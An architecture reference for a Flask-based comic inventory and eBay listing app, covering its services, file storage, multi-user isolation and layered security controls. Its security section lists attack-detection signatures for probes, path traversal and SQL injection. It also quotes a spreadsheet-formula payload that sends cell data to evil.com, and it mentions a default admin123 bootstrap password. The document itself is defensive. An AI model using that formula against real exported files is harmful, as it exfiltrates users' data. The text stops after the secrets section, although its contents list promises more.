# Application Architecture Reference

A complete blueprint of the Python/Flask web application — its structure, data
flow, startup sequence, security model, and extension points. Use this document
to replicate the same application architecture in a new project.

> Replace every `{app_name}` placeholder with your application name.
> All runtime configuration comes from AWS Secrets Manager (production) or a
> `.env` file (local development) — never hard-coded.

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Technology Stack](#technology-stack)
3. [Application Structure](#application-structure)
4. [Entry Points](#entry-points)
5. [Blueprint and Route Layout](#blueprint-and-route-layout)
6. [Service Layer](#service-layer)
7. [Data Storage Model](#data-storage-model)
8. [Multi-User Design](#multi-user-design)
    - [Directory isolation](#directory-isolation)
    - [UserManager internals](#usermanager-internals)
    - [User lifecycle](#user-lifecycle)
    - [Admin model](#admin-model)
    - [User preferences](#user-preferences)
9. [Security Model](#security-model)
    - [Layer overview](#layer-overview)
    - [Authentication and session security](#authentication-and-session-security)
    - [Authorization decorators](#authorization-decorators)
    - [CSRF protection](#csrf-protection)
    - [Request-layer middleware](#request-layer-middleware)
    - [Attack detection and auto-blocking](#attack-detection-and-auto-blocking)
    - [File upload security](#file-upload-security)
    - [CSV injection prevention](#csv-injection-prevention)
    - [Mass deletion protection](#mass-deletion-protection)
    - [Input validation and path safety](#input-validation-and-path-safety)
    - [HTTP response headers](#http-response-headers)
    - [Secret and credential handling](#secret-and-credential-handling)
10. [Concurrency and Worker Safety](#concurrency-and-worker-safety)
    - [Cross-worker sync lock](#cross-worker-sync-lock)
    - [CSV file locking](#csv-file-locking)
    - [eBay listing cache](#ebay-listing-cache)
11. [Startup Sequence](#startup-sequence)
12. [Configuration and Secrets](#configuration-and-secrets)
13. [Logging](#logging)
14. [Monitoring and Metrics](#monitoring-and-metrics)
15. [Platform Integrations](#platform-integrations)
    - [eBay Trading API](#ebay-trading-api)
    - [WhatNot exports](#whatnot-exports)
    - [Analytics heatmap](#analytics-heatmap)
16. [Frontend Design System](#frontend-design-system)
17. [Key Patterns and Conventions](#key-patterns-and-conventions)
18. [Local Development Setup](#local-development-setup)

---

## Architecture Overview

```
Browser
  │
  ▼
Nginx (SSL termination, static files, rate limiting)
  │
  ▼
Gunicorn WSGI server (4 workers, 127.0.0.1:8000)
  │
  ▼
Flask Application  ──── app factory: create_app()
  │
  ├── auth_bp      /login, /logout
  ├── main_bp      / landing, /add, /browse, /account, /price-lookup, …
  └── api_bp       /api/**  (67 routes across 11 domain modules)
        │
        ├── Services (business logic)
        │     ├── comic_service      — item CRUD orchestration
        │     ├── csv_service        — file-locked CSV read/write
        │     ├── s3_service         — S3 images, backups, sync
        │     ├── ebay_service       — eBay Trading API integration
        │     ├── snapshot_service   — manual backup/restore
        │     ├── trash_service      — soft-delete with 30-day TTL
        │     ├── health_check_service — CSV ↔ S3 image consistency
        │     ├── cloudwatch_service — custom metrics publishing
        │     ├── sns_service        — alert delivery
        │     ├── user_secrets_service — per-user eBay tokens
        │     └── analytics_service  — click heatmap analytics
        │
        └── Storage
              ├── CSV files          — inventory per user
              ├── JSON files         — preferences, settings
              └── S3 bucket          — images, exports, backups
```

---

## Technology Stack

| Layer | Technology | Notes |
|-------|-----------|-------|
| Language | Python 3.10+ | No database — CSV + JSON + S3 only |
| Web framework | Flask 3.0+ | App factory pattern; Blueprints for route isolation |
| WSGI server | Gunicorn 21+ | 4 sync workers; `127.0.0.1:8000` |
| Reverse proxy | Nginx | SSL termination, static files, rate limiting |
| Process manager | Systemd / Supervisor | Manages Gunicorn lifecycle |
| Object storage | AWS S3 | Images, exports, CSV backups, user prefs |
| Secrets | AWS Secrets Manager | Runtime secrets; `.env` fallback for local dev |
| Metrics / logs | AWS CloudWatch | Log shipping + custom metrics |
| Alerting | AWS SNS | Email/SMS on CloudWatch alarms |
| Frontend | Jinja2 + vanilla JS | No JS framework; all interactions via `fetch()` |
| CSS | Custom design tokens | `tokens.css` + `components.css` shared system |
| Image processing | Pillow | Upload validation, WebP thumbnail generation |
| File locking | `filelock` | Prevents CSV corruption under concurrent writes |
| eBay integration | eBay Trading API (XML) | Search, list, revise, end listings |

---

## Application Structure

```
app/
├── __init__.py             # App factory (create_app), logging, startup sync,
│                           # background thread, blueprint registration
├── config.py               # Config classes (Dev/Prod), get_secret() helper
├── security.py             # IP blocklist, rate limiting, attack detection
│
├── models/                 # Plain dataclasses — no ORM
│   ├── comic.py            # Comic dataclass + field definitions
│   ├── user.py             # UserManager: login, preferences, JSON storage
│   ├── snapshot.py         # Snapshot metadata dataclass
│   ├── trash_item.py       # TrashItem dataclass
│   └── analytics.py        # AnalyticsStore: heatmap event persistence
│
├── routes/
│   ├── auth.py             # login_required, csrf_required, sync_not_locked decorators
│   │                       # + /login and /logout routes
│   ├── main.py             # Page routes (10 HTML pages, CSV export/download)
│   └── api/                # REST API — 11 modules, 67 routes, all under /api
│       ├── __init__.py
│       ├── comics.py       # Item CRUD (11 routes)
│       ├── ebay.py         # eBay listing actions (10 routes)
│       ├── ebay_listings.py # Account-level listing management (3 routes)
│       ├── ebay_search.py  # Price lookup / sold search (4 routes)
│       ├── ebay_taxonomy.py # Category / item aspect lookup (4 routes)
│       ├── account.py      # User account management (13 routes)
│       ├── snapshots.py    # Backup and restore (4 routes)
│       ├── trash.py        # Soft-delete management (3 routes)
│       ├── system.py       # Health, stats, disk (6 routes)
│       ├── analytics.py    # Click heatmap events (1 route)
│       └── admin.py        # Admin settings (8 routes)
│
├── services/               # All business logic lives here — routes call services
│   ├── comic_service.py    # ComicService: CRUD orchestration for items
│   ├── csv_service.py      # CSVService: file-locked reads/writes, header init
│   ├── s3_service.py       # S3Service: upload, thumbnail, sync, restore
│   ├── ebay_service.py     # EbayService: Trading API calls, payload sanitization
│   ├── snapshot_service.py # SnapshotService: point-in-time S3 backups
│   ├── trash_service.py    # TrashService: soft-delete, 30-day retention
│   ├── health_check_service.py # CSV ↔ S3 orphan detection and cleanup
│   ├── cloudwatch_service.py   # CloudWatch metrics publishing
│   ├── sns_service.py          # SNS notifications
│   ├── user_secrets_service.py # Per-user eBay tokens in Secrets Manager
│   └── analytics_service.py   # Heatmap event aggregation
│
├── utils/                  # Shared helpers — no business logic
│   ├── user_context.py     # Multi-user path resolution (ALWAYS use these)
│   ├── logging_utils.py    # safe_error_message(), logger helpers
│   ├── helpers.py          # CSRF tokens, filename generation, directory size
│   ├── csv_sanitizer.py    # CSV injection prevention (= + - @ prefixes)
│   ├── upload_security.py  # Image upload validation (Pillow verify + size cap)
│   ├── mass_deletion_protection.py # Safety circuit breakers
│   ├── monitoring.py       # @monitor_endpoint CloudWatch decorator
│   ├── sync_state.py       # Thread-safe singleton for S3 sync progress
│   ├── ebay_helpers.py     # eBay description parsing helpers
│   ├── ebay_validators.py  # eBay CSV export field definitions
│   ├── whatnot_validators.py # WhatNot CSV export field definitions
│   └── defaults_helpers.py # User preference defaults
│
├── scripts/                # Utility / maintenance scripts (not production routes)
│   ├── util_check_comic_images.py
│   ├── util_fix_missing_thumbnails.py
│   ├── util_generate_page_images.py   # Auto-generates analytics mockup PNGs
│   ├── util_migrate_csv_schema.py
│   └── util_validate_csv_schema.py
│
├── templates/              # Jinja2 HTML templates
│   ├── base.html           # Base layout: nav, CSS/JS links, modal skeleton
│   ├── landing.html        # Dashboard / home page
│   ├── comics_list.html    # Browse / inventory grid + list view
│   ├── index.html          # Add / Edit comic form
│   ├── add_from_image.html # AI-assisted add from image
│   ├── price_lookup.html   # eBay sold price lookup tool
│   ├── ebay_listings.html  # eBay account listings manager
│   ├── account.html        # User settings and preferences
│   ├── analytics_dashboard.html # Click heatmap analytics
│   ├── trash.html          # Soft-deleted items
│   ├── login.html          # Login page
│   └── ebay_description_template.html # eBay description builder
│
└── static/
    ├── css/
    │   ├── tokens.css      # Design tokens — ALL colors, spacing, radii
    │   └── components.css  # Shared component classes (.btn, .modal, etc.)
    ├── favicon/
    ├── analytics/          # Auto-generated page mockup PNGs
    ├── 404.html / 500.html / 502.html / 503.html
    └── placeholder.png
```

---

## Entry Points

### `runapp.py` — Web Server

```python
from app import create_app

app = create_app('production')   # or 'development'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

Gunicorn targets `runapp:app`. The `create_app()` factory performs all
initialization — blueprints, logging, startup sync, background threads.

### `main.py` — CLI Tool

Standalone batch processor for CSV operations and S3 image management.
Not used by the web server. Useful for one-off migrations or data fixes.

---

## Blueprint and Route Layout

Three blueprints are registered in `create_app()`:

| Blueprint | Prefix | Purpose |
|-----------|--------|---------|
| `auth_bp` | (root) | `/login`, `/logout` |
| `main_bp` | (root) | Page routes — all return HTML |
| `api_bp` | `/api` | REST API — all return JSON |

### Page routes (`main_bp`)

| URL | Template | Notes |
|-----|----------|-------|
| `/` | `landing.html` | Dashboard |
| `/add` | `index.html` | Add / edit item form |
| `/add-from-image` | `add_from_image.html` | Image-assisted add |
| `/browse` | `comics_list.html` | Inventory grid/list |
| `/price-lookup` | `price_lookup.html` | eBay price lookup |
| `/ebay-listings` | `ebay_listings.html` | eBay account listings |
| `/account` | `account.html` | User settings |
| `/analytics` | `analytics_dashboard.html` | Heatmap analytics |
| `/trash` | `trash.html` | Soft-deleted items |
| `/download` | — | CSV export (Content-Disposition attachment) |

### API routes (`api_bp`) — summary

| Module | Route prefix | Key operations |
|--------|-------------|---------------|
| `comics.py` | `/api/comic/` | Get, create, update, delete, upload image |
| `ebay.py` | `/api/comic/<sku>/ebay/` | List, update, end, relist eBay item |
| `ebay_listings.py` | `/api/ebay/listings/` | Fetch account listings, sync status |
| `ebay_search.py` | `/api/ebay/search/` | Sold price lookup, image search |
| `ebay_taxonomy.py` | `/api/ebay/taxonomy/` | Category suggestions, item aspects |
| `account.py` | `/api/account/` | Preferences, credentials, password |
| `snapshots.py` | `/api/snapshots/` | Create, list, restore, delete backups |
| `trash.py` | `/api/trash/` | List, restore, purge soft-deletes |
| `system.py` | `/api/system/` | Health, stats, disk usage, sync status |
| `analytics.py` | `/api/analytics/` | Record click events |
| `admin.py` | `/api/admin/` | IP blocklist, rate limits, security config |

---

## Service Layer

Services are **module-level singletons** — import and use directly; do not
re-instantiate in routes.

```python
# Correct — use the module-level instance
from app.services.comic_service import comic_service
from app.services.s3_service import s3_service
from app.services.ebay_service import ebay_service
```

### Key service responsibilities

**`ComicService`** (`comic_service.py`)
- Orchestrates item CRUD: read from CSV, write via `csv_service`, sync to S3
- Generates sequential SKUs from a per-user `sku.txt` counter
- Constructs thumbnail keys and manages image associations

**`CSVService`** (`csv_service.py`)
- Single writer for all CSV mutations — acquires a `filelock` before writing
- Initializes CSV with schema headers if not present
- Sanitizes all cell values through `csv_sanitizer.py` (CSV injection prevention)
- Never call `open(csv_path, 'w')` directly from routes — always go through this service

**`S3Service`** (`s3_service.py`)
- Uploads images (full + WebP thumbnail), exports, and CSV backups to S3
- Bi-directional sync: `sync_images_from_s3()`, `sync_exports_from_s3()`
- Restores CSV, SKU, and user preferences on startup
- Generates time-limited pre-signed URLs for downloads

**`EbayService`** (`ebay_service.py`)
- Wraps eBay Trading API XML calls (AddFixedPriceItem, ReviseFixedPriceItem, EndItem)
- Auto-sanitizes XML payloads via `_sanitize_trading_payload_strings()` — escapes bare `&`
- Caches category taxonomy locally in `instance/ebay_category_cache.json`
- Manages per-user tokens via `user_secrets_service`

**`SnapshotService`** (`snapshot_service.py`)
- Creates on-demand point-in-time S3 snapshots (CSV + images)
- Lists, restores, and deletes named snapshots

**`TrashService`** (`trash_service.py`)
- Soft-deletes items to `instance/data/{username}/trash/recent/`
- Auto-expires items older than 30 days
- Expiry cleanup runs on startup for all registered users

**`HealthCheckService`** (`health_check_service.py`)
- Runs after every startup S3 sync
- Detects orphaned S3 image keys (in S3 but not in CSV)
- Detects orphaned local images (on disk but not in CSV)
- Deletes confirmed orphans in both locations

---

## Data Storage Model

This application uses **no database**. All persistent state is in files.

### Shared instance files

| File | Purpose | Per-user? |
|------|---------|-----------|
| `user_preferences.json` | All user credentials + preferences; synced to S3 | No — keyed by username |
| `app_defaults.json` | Application-level default settings (e.g. default eBay listing fields, category mappings) | No |
| `ebay_category_cache.json` | eBay category taxonomy; shared across all users; initialized at startup | No |
| `blocked_ips.json` | Persistent IP blocklist; loaded on startup; updated on every block/unblock | No |
| `.sync.lock` | `fcntl` cross-worker sync mutex | No |
| `app_version` | Build number written by deploy playbook; read by `inject_version()` context processor | No |

### Per-user data layout

```
instance/
├── user_preferences.json      # All users' credentials + preferences (synced to S3)
├── app_defaults.json          # Application-level defaults
├── ebay_category_cache.json   # eBay taxonomy cache (shared, not per-user)
│
└── data/
    └── {username}/
        ├── items.csv          # Inventory — one row per item
        ├── sku.txt            # Sequential SKU counter (integer)
        ├── images/            # Full-resolution images
        ├── exports/           # Generated CSV exports (WhatNot, eBay)
        ├── snapshots/         # Named point-in-time backups
        └── trash/
            └── recent/        # Soft-deleted items (30-day TTL)
```

### CSV schema

`items.csv` is the canonical data store. Every row is one item (a comic).
Fields include: `sku`, `title`, `issue`, `publisher`, `grade`, `price`,
`condition`, `description`, `image_url`, `thumbnail_url`, `ebay_item_id`,
`ebay_status`, `ebay_price`, `ebay_schedule_time`, `whatnot_listed`, and
platform-specific export fields.

All CSV writes go through `CSVService` — never raw `open()`:
```python
csv_service.update_comic(csv_path, sku, updated_fields)
csv_service.delete_comic(csv_path, sku)
```

### S3 key structure

```
{s3_bucket_name}/
└── {s3_folder}/               # e.g. "production"
    └── {username}/
        ├── items.csv
        ├── sku.txt
        ├── user_preferences.json
        ├── images/
        │   ├── {sku}.jpg
        │   └── {sku}_thumb.webp
        ├── exports/
        └── snapshots/
```

### `user_preferences.json` schema

```json
{
  "{username}": {
    "password_hash": "...",
    "created_at": "ISO-8601",
    "preferences": {
      "default_view": "grid",
      "theme": "dark"
    },
    "ebay_credentials": "stored-in-secrets-manager"
  }
}
```

---

## Multi-User Design

### Directory isolation

Each user has a fully isolated subtree on disk and in S3. No user can see or
modify another user's data.

```
instance/
├── user_preferences.json      # ALL users — shared file, per-user keys
├── app_defaults.json          # App-level defaults (shared, not per-user)
├── ebay_category_cache.json   # eBay taxonomy cache (shared, not per-user)
├── blocked_ips.json           # IP blocklist (shared, not per-user)
├── .sync.lock                 # Cross-worker sync lock file
└── data/
    └── {username}/            # One directory per user (lowercase)
        ├── items.csv
        ├── sku.txt
        ├── images/
        ├── exports/
        ├── snapshots/
        ├── trash/
        │   └── recent/
        ├── analytics/
        └── uploads/           # Temporary upload staging (not persisted)
```

**All path construction goes through `app/utils/user_context.py`**.
Never hand-craft `f"instance/data/{username}/..."` in routes or services.

```python
from app.utils.user_context import (
    get_current_username,     # reads session['username']
    get_user_csv_file,        # → Path("instance/data/{u}/items.csv")
    get_user_sku_file,        # → Path("instance/data/{u}/sku.txt")
    get_user_image_dir,       # → Path("instance/data/{u}/images/")
    get_user_images_dir,      # alias for get_user_image_dir
    get_user_exports_dir,     # → Path("instance/data/{u}/exports/")
    get_user_trash_dir,       # → Path("instance/data/{u}/trash/")
    get_user_snapshots_dir,   # → Path("instance/data/{u}/snapshots/")
    get_user_analytics_dir,   # → Path("instance/data/{u}/analytics/")
    get_user_uploads_dir,     # → Path("instance/data/{u}/uploads/")
    migrate_legacy_user_files,  # one-time migration from flat to subdirectory layout
)
```

All helpers create the directory on first call if it does not exist. The
`username` argument always comes from `session['username']` — never from the
request body.

### UserManager internals

`UserManager` (`app/models/user.py`) is the single authority for user
credentials and preferences. One module-level singleton is shared across all
workers: `user_manager = UserManager()`.

#### File-backed cache

`_load_users()` reads `instance/user_preferences.json` and caches the result
in-memory. Before returning cached data it checks the file's `mtime`; if the
file changed on disk (e.g., written by another Gunicorn worker), it reloads.
This balances I/O efficiency with consistency in a multi-worker environment.

```python
# Reload only when the file has changed
if self._users_cache is None or self._last_modified != current_mtime:
    self._users_cache = json.load(open(users_file))
    self._last_modified = current_mtime
```

Fallback chain on missing or empty file:
1. If cache is non-empty (written by this process), recreate the file from cache.
2. Otherwise, initialize from the `USERS` secret (Secrets Manager → env var), if set.
3. If `USERS` is not set, no default users are created — an operator must create them.

#### Write-through to S3

`_save_users(users)` writes to `user_preferences.json` and immediately calls
`s3_service.backup_user_preferences_to_s3()`. S3 failure is logged but does not
prevent the local write from completing (non-fatal).

#### `USERS` secret bootstrap format

The `USERS` secret (read via `get_secret('USERS', '')`) uses a simple
comma-separated format:

```
username:password,user2:pass2
```

On first boot, if no `user_preferences.json` exists, the app parses the
`USERS` secret, hashes all passwords (bcrypt), and writes the file. This is
the recommended way to seed users in a new deployment via Ansible vault.

### User lifecycle

#### Creating a user

`create_user(username, password)`:
1. Validates username against the allow-list regex.
2. Checks for duplicates.
3. If the only existing user is the auto-created default admin (`username=admin`,
   password=`admin123`, default prefs), it is automatically removed and replaced.
   This allows the first real user creation to also clean up the bootstrap account.
4. Hashes the password (bcrypt via Werkzeug).
5. Writes updated `user_preferences.json` and backs up to S3.
6. Calls `_initialize_user_data(username)` which creates:
   - `items.csv` (empty file)
   - `sku.txt` (starting value: `1000`)
   - All user subdirectories via `user_context.py` helpers

#### Changing a username

`change_username(old, password, new)` renames the key in `user_preferences.json`
but does **not** rename the filesystem directory. The data directory remains
under the old username key until manually migrated or recreated.

#### Deleting a user

`delete_user(username)` refuses to delete the last remaining user — at least
one account must always exist. It does not delete the user's data directory.

#### Canonicalization

Usernames are stored lowercase as the dict key:

```python
users[username.lower()] = {'username': username, ...}
                                         # ↑ original casing for display
```

Sessions always store the lowercase canonical form. `get_user(username)` calls
`username.lower()` before the lookup so comparisons are always case-insensitive.

### Admin model

`is_admin(username)` evaluates three rules in priority order:

| Rule | Condition | Result |
|------|-----------|--------|
| 1 — Explicit flag | `user['is_admin'] == True` in record | Admin |
| 2 — Single-user bootstrap | No user has `is_admin` flag AND only one user exists | That user is admin |
| 3 — Legacy fallback | No user has `is_admin` flag AND multiple users | Alphabetically first username (by lowercase key) is admin |

`set_admin(username, is_admin=True)` grants or revokes the explicit flag.
Once any user has `is_admin=True`, rules 2 and 3 no longer apply — only
explicitly flagged users are admins.

`admin_required` decorator checks `is_admin(session['username'])` on every
call. Admin routes are registration-time decorated — there is no runtime
bypass.

### User preferences

All preferences have defaults defined in `UserManager.DEFAULT_PREFERENCES`:

| Key | Default | Purpose |
|-----|---------|---------|
| `timezone` | `local` | Display timezone |
| `mobile_per_page` | `8` | Items per page on mobile |
| `desktop_per_page` | `24` | Items per page on desktop |
| `default_sort` | `sku_asc` | Default sort order on browse page |
| `default_view` | `grid` | Grid or list view on browse page |
| `micro_card_size` | `60` | Card size as percent of normal |
| `ebay_format` | `FixedPrice` | eBay listing format |
| `ebay_duration` | `GTC` | eBay listing duration (Good Till Cancelled) |
| `ebay_listing_mode` | `future` | Schedule (`future`) or list immediately (`list`) |
| `ebay_environment` | `production` | eBay API environment |
| `ebay_location` | `Highlands Ranch, CO` | eBay item location |
| `ebay_postal_code` | `80129` | eBay postal code for shipping |

`get_preferences(username)` always merges stored values with the defaults
so missing keys never cause KeyErrors when new preferences are added.
`update_preferences(username, preferences)` writes only the provided keys
(partial update).

---

## Security Model

Security is implemented in concentric layers. Every layer is independent —
a bypass at one layer does not grant access through the next.

### Layer overview

```
Internet
  │
  ▼  1. Nginx — SSL/TLS, static file isolation, Nginx-level rate limit
  │
  ▼  2. Flask before_request — IP blocklist check, attack pattern detection, app-level rate limit
  │
  ▼  3. Route decorators — @login_required, @csrf_required, @admin_required
  │
  ▼  4. Input validation — username regex, secure_filename, Pillow verify, size cap
  │
  ▼  6. Service layer — user_context path confinement, csv_service locking, mass deletion protection
  │
  ▼  7. HTTP response headers — X-Frame-Options, nosniff, HSTS, Referrer-Policy, CSP
```

---

### Authentication and session security

#### Login endpoint (`/login`)

- Credentials validated via `UserManager.verify_password()` (bcrypt password hashes)
- CSRF token validated on the login form POST itself — no unauthenticated state-change
- **Brute-force protection:** per-IP login attempt counter tracked by `RateLimiter`.
  After 10 failed attempts from the same IP within 15 minutes the endpoint returns 429.
  The counter resets automatically on a successful login.
- On success: session populated with `logged_in=True`, `username` (canonical lowercase),
  and `session_created` timestamp; old CSRF token cleared.
- On logout: `session.clear()` — all session data destroyed.

#### Session security

| Setting | Value |
|---------|-------|
| `SESSION_COOKIE_HTTPONLY` | `True` — JS cannot read the cookie |
| `SESSION_COOKIE_SAMESITE` | `Lax` — blocks cross-site POST |
| `SESSION_COOKIE_SECURE` | `True` in production (HTTPS only); `False` in development |
| `PERMANENT_SESSION_LIFETIME` | 24 hours |
| Session invalidation on restart | Development: `SECRET_KEY` regenerated with `os.urandom(24)` each restart, making all existing sessions invalid. Production: fixed key from Secrets Manager (sessions survive restart). |

#### Post-restart session invalidation

Even in production, sessions created before the last server start are
invalidated by `login_required`. Every session stores a `session_created`
Unix timestamp. On each request, the decorator compares it against
`APP_START_TIME` (set at module import); sessions older than the last
restart are cleared and the user is redirected to `/login`.

#### Open redirect protection

The post-login `?next=` redirect is validated by `is_safe_url()` which
checks that the target URL's scheme and host match the current request. Any
external URL in `?next=` is silently dropped and the user is sent to `/`.

#### Username allow-list

All usernames are validated against a strict regex before any path, S3 key,
or Secrets Manager name is constructed from them:

```
^[A-Za-z0-9_\-]{3,32}$
```

Characters outside this set (slashes, dots, colons, null bytes, shell
metacharacters) are rejected at login and at every account creation call.
This prevents both path traversal and S3/AWS resource name injection.

---

### Authorization decorators

All decorators are defined in `app/routes/auth.py`.

| Decorator | Applied to | Effect |
|-----------|-----------|--------|
| `@login_required` | All page routes + all API routes | Returns 401 JSON or login redirect if session is absent or pre-restart |
| `@csrf_required` | All state-changing API routes (POST/PUT/DELETE) | Returns 403 if CSRF token missing or mismatched |
| `@admin_required` | Admin-only API routes | Returns 403 if `session['username']` is not flagged as admin in `user_preferences.json` |
| `@sync_not_locked` | Write routes that conflict with S3 sync | Returns 503 while background sync lock is held |
| `@disk_space_required(min_percent=15)` | Upload and write routes | Returns 507 if free disk falls below 15% |

The `admin_required` decorator must always be layered **after** `login_required`:
```python
@api_bp.route('/admin/settings', methods=['POST'])
@login_required
@csrf_required
@admin_required
def update_admin_settings():
    ...
```

---

### CSRF protection

1. `generate_csrf_token()` in `app/utils/helpers.py` creates a random token
   stored in `session['_csrf_token']` and injected into every template as a
   Jinja2 global and a `<meta name="csrf-token">` tag.
2. Every state-changing JavaScript call reads the tag and sends the token as a
   request header:
   ```javascript
   headers: { 'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content }
   ```
3. `@csrf_required` reads the stored session token and the header/form token
   and rejects the request with 403 if either is missing or they do not match.
4. The CSRF token is rotated (cleared) on every successful login so a token
   captured before login cannot be reused.

---

### Request-layer middleware

`app/security.py` installs hooks via `init_security_middleware(app)`:
- `app.before_request(security_middleware)` — runs on every request
- `app.after_request(add_security_headers)` — runs on every response

#### IP blocklist

- Stored in-memory as `{ip: expiration_unix_timestamp}`.
- Persisted to `instance/blocked_ips.json` so blocks survive app restart.
- Expired entries are pruned lazily on each check and on a periodic cleanup sweep.
- Blocked IPs receive `403 Access denied` with no further processing.
- Admin API (`/api/admin/`) provides endpoints to view, add, and remove blocks.

#### Application-level rate limiting

- **Global:** 600 requests per minute per IP (sliding window). Exceeded → 429.
  No auto-block — just rejection.
- **Login endpoint:** 10 failed attempts per IP per 15 minutes → 429. Counter
  resets on successful login.
- Implementation: `RateLimiter` tracks per-IP timestamps in memory. A cleanup
  sweep removes timestamps older than 1 hour every 5 minutes.

#### Real IP extraction

`get_real_ip(request)` reads `X-Forwarded-For` (first entry, set by Nginx
or a reverse proxy), then `X-Real-IP`, then `request.remote_addr`. This ensures rate
limits and blocklist entries target the actual client, not the proxy.

---

### Attack detection and auto-blocking

`security_middleware()` checks every incoming path + query string against a
compiled list of regex attack signatures:

| Category | Patterns |
|----------|----------|
| Config/env probes | `.env`, `.git/`, `.aws/`, `config.php`, `wp-config`, `.htaccess`, `web.config` |
| CMS scanners | `/phpmyadmin`, `/phpMyAdmin`, `/mysql`, `/dbadmin`, `/wp-admin`, `/wp-login.php`, `/xmlrpc.php`, `/administrator` |
| Path traversal | `../`, `..\` |
| SQL injection | `union.*select`, `concat(...)`, `-- ` (comment sequences) |

**On first match:** request rejected with 403; attack attempt count for that IP
is incremented using a separate `attack_{ip}` key in `RateLimiter`.

**Auto-block:** if an IP triggers ≥ 5 attack patterns within 60 seconds, it is
auto-blocked via `ip_blocklist.block_ip(ip, duration_hours=1)`. Subsequent
requests return 403 without further pattern scanning.

> Nginx independently blocks most of these at the vhost level. The
> application-layer patterns are a secondary defence for requests that bypass
> or are not yet covered by the Nginx ruleset.

---

### File upload security

All image uploads go through `app/utils/upload_security.py` →
`validate_uploaded_image(file_storage)` before any byte is written to disk or
S3.

| Check | Implementation |
|-------|---------------|
| Filename sanitization | `werkzeug.utils.secure_filename()` — strips path separators, null bytes, and dangerous characters |
| Extension allow-list | `{jpg, jpeg, png, gif, webp}` — case-insensitive; `.` prefix stripped before comparison |
| Server-side size cap | 10 MB per file (`DEFAULT_MAX_BYTES`); also enforced by Flask `MAX_CONTENT_LENGTH = 96 MB` (up to 8 images per request + overhead) |
| Content validation | `PIL.Image.open(stream).verify()` — rejects truncated, corrupt, and non-image files even if the extension looks correct |
| Decompression bomb protection | `PIL.Image.DecompressionBombError` caught and rejected |
| Generated storage filename | Caller always uses a derived name (`{sku}.jpg`, UUID) — the safe_name returned by the validator is never used as the stored key |
| Stream rewind | Validator rewinds stream to position 0 on success so caller can read or forward bytes without seeking |

The validator raises `UploadValidationError(message, status_code)` on failure.
`status_code` is 413 for size violations and 400 for everything else. Route
handlers map this directly to the JSON response.

```python
from app.utils.upload_security import validate_uploaded_image, UploadValidationError

try:
    safe_name, ext = validate_uploaded_image(request.files['image'])
except UploadValidationError as e:
    return jsonify({'error': str(e)}), e.status_code

stored_filename = f"{sku}.{ext}"   # never use safe_name as the stored key
```

---

### CSV injection prevention

`app/utils/csv_sanitizer.py` prevents spreadsheet formula injection in
exported CSV files (WhatNot exports, eBay exports, download CSV).

Spreadsheet applications (Excel, Google Sheets, LibreOffice Calc) treat cells
beginning with `=`, `+`, `-`, `@`, `\t`, or `\r` as formulas. A crafted value
such as `=HYPERLINK("http://evil.com/steal?q="&A1,"click me")` can exfiltrate
data or execute commands on the reviewer's machine.

**Prevention:** `sanitize_cell(value)` prefixes any such leading character with
a single apostrophe (`'`). Spreadsheets render the apostrophe as empty and
display the literal text; the `csv` module preserves it as-is.

```python
sanitize_cell("=EVIL()")  →  "'=EVIL()"
sanitize_cell("+1234")    →  "'+1234"
sanitize_cell("Normal")   →  "Normal"   # unchanged
```

`sanitize_row(row_dict)` applies `sanitize_cell` to every string value in a
row. Used in `main.py` CSV download route and all export builders.

> The application's own `items.csv` is **not** sanitized — the app reads those
> values back and a prefix would corrupt them. Sanitization is export-only.

---

### Mass deletion protection

`app/utils/mass_deletion_protection.py` provides five independent circuit
breakers to prevent accidental bulk deletion of images (for example, during an
S3 orphan cleanup that runs on bad data):

| Circuit breaker | Threshold | Behaviour |
|----------------|-----------|-----------|
| Zero-count guard | `total_count == 0` | Always blocks — system reporting zero items is a data error |
| Percentage cap | > 50% of total images | Block operation |
| Absolute count cap | > 100 images at once | Block operation |
| Rapid deletion rate limit | > 3 delete operations in 5 minutes | Block operation |
| Empty CSV guard | CSV has < 5 items | Block cleanup operations — CSV may be empty or corrupt |

When any check fails the operation raises `ValueError` with a descriptive message.
The calling service logs the block and returns an error response to the user.

The `@require_deletion_safety` decorator applies checks 1–4 to any function
that accepts `deletion_count` and `total_count` kwargs. Check 5 is called
explicitly via `check_csv_health_before_cleanup(comic_count)`.

---

### Input validation and path safety

#### Request input validation

- Every API endpoint validates required fields, types, string lengths, and
  numeric ranges at entry. Unknown fields are rejected.
- String length caps are enforced server-side (titles, descriptions, SKUs).
  Browser-side limits are not trusted.

#### Path confinement

All filesystem paths built from user input go through `user_context.py` helpers
that resolve the path and assert it remains under the expected user base
directory:

```python
base = Path(user_dir).resolve()
candidate = (base / secure_filename(name)).resolve()
if base not in candidate.parents and base != candidate:
    abort(400, 'Invalid path')
```

`..`, absolute paths, null bytes, and symlinks in user-supplied names are
rejected before the path is constructed.

#### SQL / template / subprocess safety

| Vector | Control |
|--------|---------|
| SQL | No database — not applicable |
| Jinja2 templates | Autoescape enabled (default); `\|safe` never used on user-controlled data |
| Subprocess | Not used with user input |
| `eval` / `exec` / `pickle` | Not used anywhere in the codebase |
| `yaml.load` | Not used; `yaml.safe_load` is the project standard |
| XML (eBay API) | `EbayService._sanitize_trading_payload_strings()` escapes bare `&` in all Trading API payloads before sending |

---

### HTTP response headers

`add_security_headers(response)` runs on every response via `after_request`.

| Header | Value | Purpose |
|--------|-------|---------|
| `X-Frame-Options` | `SAMEORIGIN` | Prevents clickjacking in iframes on other origins |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing on downloads |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limits referrer leakage to cross-origin requests |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Forces HTTPS for 1 year (production only, when `SESSION_COOKIE_SECURE=True`) |
| `Content-Security-Policy` | Set by **Nginx** in production (single source of truth); set by Flask in development only | Restricts script/style/image sources to `'self'` with carve-outs for Google Fonts and AWS S3 |

> CSP is intentionally set only by Nginx in production to avoid double-header
> conflicts. The browser enforces the most restrictive of multiple CSP headers,
> which can silently break features when both Flask and Nginx send one.

---

### Secret and credential handling

| Rule | Implementation |
|------|---------------|
| No static keys on EC2 | EC2 instance uses IAM instance profile — no `AWS_ACCESS_KEY_ID` on disk |
| Per-user eBay tokens | Stored in AWS Secrets Manager under `{app_name}/users/{username}/ebay`; never written to CSV, JSON, or logs |
| Flask `SECRET_KEY` | Read from Secrets Manager in production; random on each dev restart |
